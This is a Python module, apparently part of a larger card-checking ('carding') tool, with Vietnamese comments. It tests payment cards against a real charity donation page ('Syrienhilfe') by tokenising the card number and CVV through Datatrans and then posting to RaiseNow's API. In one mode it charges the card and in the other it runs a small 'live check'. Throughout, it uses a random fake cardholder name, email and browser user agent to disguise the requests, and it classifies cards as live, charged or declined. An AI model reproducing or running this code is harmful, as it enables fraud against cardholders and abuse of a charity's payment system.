import requests
import json
import logging
import random
import string
import time

# Cấu hình logging cho file này
logger = logging.getLogger(__name__)

# --- UTILITY FUNCTIONS (COPIED FROM MAIN) ---
# Các hàm tiện ích này được sao chép từ file chính để file này có thể hoạt động độc lập.

def generate_random_string(length=8):
    """Generates a random string of characters."""
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def random_email():
    """Generates a random email address."""
    prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 15)))
    domain = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
    return f"{prefix}@{domain}.com"
    
def random_user_agent():
    """Generates a random realistic User-Agent string."""
    chrome_major = random.randint(100, 125)
    chrome_build = random.randint(0, 6500)
    chrome_patch = random.randint(0, 250)
    win_major = random.randint(10, 11)
    win_minor = random.randint(0, 3)
    win_build = random.randint(10000, 22631)
    win_patch = random.randint(0, 500)
    webkit_major = random.randint(537, 605)
    webkit_minor = random.randint(36, 99)
    safari_version = f"{webkit_major}.{webkit_minor}"
    chrome_version = f"{chrome_major}.0.{chrome_build}.{chrome_patch}"
    win_version = f"{win_major}.{win_minor}; Win64; x64"
    return (
        f"Mozilla/5.0 (Windows NT {win_version}) "
        f"AppleWebKit/{safari_version} (KHTML, like Gecko) "
        f"Chrome/{chrome_version} Safari/{safari_version}"
    )

def make_request_with_retry(session, method, url, max_retries=5, cancellation_event=None, **kwargs):
    """Makes a request with retry logic, similar to the main file."""
    last_exception = None
    for attempt in range(max_retries):
        if cancellation_event and cancellation_event.is_set():
            return None, "Operation cancelled by user"
        
        try:
            response = session.request(method, url, **kwargs)
            return response, None
        except requests.exceptions.RequestException as e:
            last_exception = e
            wait_time = attempt + 1
            logger.warning(f"Attempt {attempt + 1}/{max_retries} for {url} failed: {e}. Retrying in {wait_time}s...")
            time.sleep(wait_time)
    
    final_error_message = f"Retry: All {max_retries} retry attempts for {url} failed. Last error: {last_exception}"
    logger.error(final_error_message)
    return None, final_error_message

# --- GATE 3 CHECKER LOGIC ---

def check_card_gate3(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate3_mode_func, get_charge_value_func, custom_charge_amount=None):
    """
    Logic for Gate 3 - Charge or Live Check Mode.
    Hàm này được gọi từ file main.py.
    """
    gate3_mode = get_gate3_mode_func()
    try:
        user_agent = random_user_agent()
        first_name = generate_random_string(random.randint(12, 20))
        last_name = generate_random_string(random.randint(10, 20))
        cardholder = f"{first_name} {last_name}"
        email = random_email()

        # Step 1: Tokenize card
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://pay.datatrans.com",
            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField",
            "User-Agent": user_agent,
            "X-Requested-With": "XMLHttpRequest"
        }
        tokenize_payload = {
            "mode": "TOKENIZE",
            "formId": "250807082606088731",
            "cardNumber": cc,
            "cvv": cvv,
            "paymentMethod": "ECA",
            "merchantId": "3000022877",
            "browserUserAgent": user_agent,
            "browserJavaEnabled": "false",
            "browserLanguage": "vi-VN",
            "browserColorDepth": "24",
            "browserScreenHeight": "844",
            "browserScreenWidth": "390",
            "browserTZ": "-420"
        }
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Tokenize Error: {error}", bin_info
        if not token_response: return 'error', line, "HTTP Error with no response during Tokenization", bin_info

        if "Card number not allowed in production" in token_response.text:
            return 'decline', line, 'CARD_NOT_ALLOWED_DECLINE', bin_info

        try:
            token_data = token_response.json()
            if "error" in token_data and "message" in token_data.get("error", {}):
                return 'decline', line, token_data["error"]["message"], bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", "Unknown error at Tokenize"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"HTTP Error {token_response.status_code} during Tokenization", bin_info
            return 'error', line, "Tokenize response was not JSON", bin_info

        # Step 2: Make request based on mode
        payment_headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://donate.raisenow.io",
            "Referer": "https://donate.raisenow.io/",
            "User-Agent": user_agent
        }
        
        base_payload = {
            "account_uuid": "6fe80dce-e221-487a-817e-5e93a1d2119a",
            "test_mode": False,
            "create_supporter": False,
            "supporter": {
                "locale": "en",
                "first_name": first_name,
                "last_name": last_name,
                "email": email,
                "email_permission": False,
                "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}
            },
            "raisenow_parameters": {
                "analytics": {
                    "channel": "paylink",
                    "preselected_amount": "5000",
                    "suggested_amounts": "[1000,2000,5000]",
                    "user_agent": user_agent
                },
                "solution": {"uuid": "834f9dcc-f4a1-4d56-8aa5-ab21a88d917f", "name": "Syrienhilfe (3476)", "type": "donate"},
                "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/hvtkm?lng=en", "uuid": "self-service", "version": "2.16.0"}
            },
            "custom_parameters": {
                "campaign_id": "",
                "campaign_subid": "",
                "rnw_recurring_interval_name": "monthly",
                "rnw_recurring_interval_text": "Monthly"
            },
            "payment_information": {
                "brand_code": "eca",
                "cardholder": cardholder,
                "expiry_month": mes.zfill(2),
                "expiry_year": ano,
                "transaction_id": transaction_id
            },
            "profile": "3b718a2e-be58-48ce-95f5-ff6471108a78",
            "return_url": "https://donate.raisenow.io/hvtkm?lng=en&rnw-view=payment_result"
        }

        # --- CHARGE MODE ---
        if gate3_mode == 'charge':
            charge_value = get_charge_value_func('3', custom_charge_amount)
            payment_url = "https://api.raisenow.io/payments" # Charge endpoint
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "EUR", "value": charge_value}
            
            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment", bin_info
            
            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            
            if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
            elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
            elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info
        
        # --- LIVE CHECK MODE ---
        else:
            payment_url = "https://api.raisenow.io/payment-sources" # Live check endpoint
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "EUR", "value": 50}
            payment_payload["subscription"] = {"recurring_interval": "7 * *", "timezone": "Asia/Bangkok"}

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Source Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment Source", bin_info

            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            if '"payment_source_status":"pending"' in response_text: return 'live_success', line, response_text, bin_info
            elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info

    except Exception as e:
        logger.error(f"Unknown error in Gate 3 for line '{line}': {e}", exc_info=True)
        return 'error', line, f"Gate 3 System Error: {e}", bin_info
